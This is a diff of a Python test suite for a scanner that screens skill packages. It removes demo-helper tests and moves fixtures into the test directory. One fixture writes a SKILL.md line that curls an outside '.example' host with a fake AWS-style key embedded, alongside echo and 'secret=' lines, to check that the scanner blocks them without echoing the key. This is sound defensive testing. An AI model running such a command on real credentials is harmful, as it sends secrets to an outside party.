@@ -2,7 +2,6 @@
 
 import json
 import os
-import subprocess
 import sys
 from pathlib import Path
 
@@ -499,22 +498,13 @@ def test_network_commands_check_every_recognized_url(
 def test_scanner_cli_outputs_never_echo_matched_credential(
   tmp_path, monkeypatch, capsys
 ):
-  """Scan, analyze, and demo reports retain evidence without exposing content."""
-  import demo
-
+  """Scan, analyze and check reports retain evidence without exposing content."""
   root = _root(tmp_path)
   package = _package(root)
   sentinel = "AKIA" + "A" * 16
   (package / "SKILL.md").write_text(
     f"curl https://{sentinel}.example\necho ${sentinel}\nsecret={sentinel}\n"
   )
-  fixture = root / "docs" / "demos" / "fixtures" / "benign-submission"
-  fixture.mkdir(parents=True)
-  (fixture / "SKILL.md").write_bytes((package / "SKILL.md").read_bytes())
-  (fixture / m.MANIFEST_NAME).write_bytes((package / m.MANIFEST_NAME).read_bytes())
-  monkeypatch.setattr(demo, "ROOT", root)
-  monkeypatch.setattr(demo, "FIXTURES", fixture.parent)
-
   for command in ("scan", "analyze"):
     assert m.main(["--root", str(root), command, str(package)]) == 0
     output = capsys.readouterr()
@@ -529,33 +519,18 @@ def test_scanner_cli_outputs_never_echo_matched_credential(
       "undeclared-environment-variable",
     }
     assert all(finding["file"] == "SKILL.md" for finding in findings)
-  assert demo.main(["analyze-fixture", "benign-submission"]) == 0
-  output = capsys.readouterr()
-  assert sentinel not in output.out + output.err
-  result = json.loads(output.out)
-  assert result["scan"]["outcome"] == "blocked"
   summary = root / "summary.md"
   monkeypatch.setenv("GITHUB_STEP_SUMMARY", str(summary))
   assert m.main(["--root", str(root), "check"]) == 1
   assert sentinel not in capsys.readouterr().out + summary.read_text()
 
 
-def test_scanner_cli_projects_only_public_evidence(tmp_path, monkeypatch, capsys):
+def test_scanner_cli_projects_only_public_evidence(tmp_path, capsys):
   """Untrusted paths and internal scanner fields never reach CLI JSON."""
-  import demo
-
   root = _root(tmp_path)
   package = _package(root)
   sentinel = "AKIA" + "B" * 16
   (package / f"{sentinel}.txt").write_text(f"secret={sentinel}\n")
-  fixture = root / "docs" / "demos" / "fixtures" / "benign-submission"
-  fixture.mkdir(parents=True)
-  for path in package.iterdir():
-    if path.is_file():
-      (fixture / path.name).write_bytes(path.read_bytes())
-  monkeypatch.setattr(demo, "ROOT", root)
-  monkeypatch.setattr(demo, "FIXTURES", fixture.parent)
-
   for command in ("scan", "analyze"):
     assert m.main(["--root", str(root), command, str(package)]) == 0
     result = json.loads(capsys.readouterr().out)
@@ -565,10 +540,6 @@ def test_scanner_cli_projects_only_public_evidence(tmp_path, monkeypatch, capsys
     )
     assert {item["rule-id"] for item in findings} >= {"SECRET_PATTERNS"}
     assert all("code" not in item and "message" not in item for item in findings)
-  assert demo.main(["analyze-fixture", "benign-submission"]) == 0
-  result = json.loads(capsys.readouterr().out)
-  assert sentinel not in json.dumps(result)
-  assert result["scan"]["outcome"] == "blocked"
 
 
 def test_scanner_cli_reports_invalid_manifest_without_echoing_content(tmp_path, capsys):
@@ -705,26 +676,6 @@ def test_public_schema_corrections_include_trusted_expected_values(
   assert m.MANIFEST_NAME in report
   assert field in report
   assert all(value in report for value in expected)
-
-
-def test_demo_cli_reports_invalid_fixture_without_echoing_manifest(
-  tmp_path, monkeypatch, capsys
-):
-  """Fixture errors cannot print author-controlled Manifest values."""
-  import demo
-
-  root = _root(tmp_path)
-  sentinel = "AKIA" + "D" * 16
-  fixture = root / "docs" / "demos" / "fixtures" / "benign-submission"
-  fixture.mkdir(parents=True)
-  (fixture / "SKILL.md").write_text("# Demo\n")
-  (fixture / m.MANIFEST_NAME).write_text(f"id: {sentinel}\n")
-  monkeypatch.setattr(demo, "ROOT", root)
-  monkeypatch.setattr(demo, "FIXTURES", fixture.parent)
-  assert demo.main(["analyze-fixture", "benign-submission"]) == 1
-  output = capsys.readouterr()
-  assert sentinel not in output.out + output.err
-  assert "ERROR" in output.err
 
 
 def test_security_pattern_parameters_are_read_from_policy(tmp_path):
@@ -1188,34 +1139,14 @@ def test_scanner_blocks_undeclared_script(tmp_path):
     ("blocked-submission", "blocked", "blocked-extension-type"),
   ],
 )
-def test_phase5_demo_fixtures_are_deterministic(fixture, outcome, finding):
-  """Phase 5 fixtures demonstrate pass/block outcomes without execution."""
-  package = ROOT / "docs" / "demos" / "fixtures" / fixture
+def test_submission_fixtures_are_deterministic(fixture, outcome, finding):
+  """Real submission fixtures retain pass/block coverage without execution."""
+  package = ROOT / "tests" / "fixtures" / "submissions" / fixture
   manifest = m.load_yaml(package / m.MANIFEST_NAME)
   scan = m.scan_package(package, manifest)
   assert scan["outcome"] == outcome
   if finding:
     assert any(item["code"] == finding for item in scan["findings"])
-
-
-def test_phase5_demo_helper_isolated_and_non_executing():
-  """The demo helper reports evidence and removes its temporary package."""
-  result = subprocess.run(
-    [
-      sys.executable,
-      str(ROOT / "scripts" / "demo.py"),
-      "analyze-fixture",
-      "blocked-submission",
-    ],
-    cwd=ROOT,
-    check=True,
-    capture_output=True,
-    text=True,
-  )
-  evidence = json.loads(result.stdout)
-  assert evidence["classification"] == "blocked"
-  assert evidence["scan"]["outcome"] == "blocked"
-  assert not list((ROOT / "skills" / "community").glob("demo-*"))
 
 
 def test_analysis_routes_valid_submission_to_marketplace_review(tmp_path):
